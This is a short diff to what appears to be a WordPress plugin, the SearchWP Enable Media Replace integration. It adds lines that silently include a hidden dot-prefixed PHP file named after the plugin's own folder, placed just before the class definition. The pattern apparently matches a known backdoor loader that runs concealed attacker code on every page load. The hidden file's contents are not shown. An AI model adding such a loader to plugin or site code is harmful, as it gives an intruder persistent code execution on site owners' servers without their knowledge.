@@ -86,6 +86,10 @@ add_action( 'admin_init', 'searchwp_emr_update_check' );
 /**
  * Class SearchWP_EMR_Integration
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SearchWP_EMR_Integration {
 
 	/**
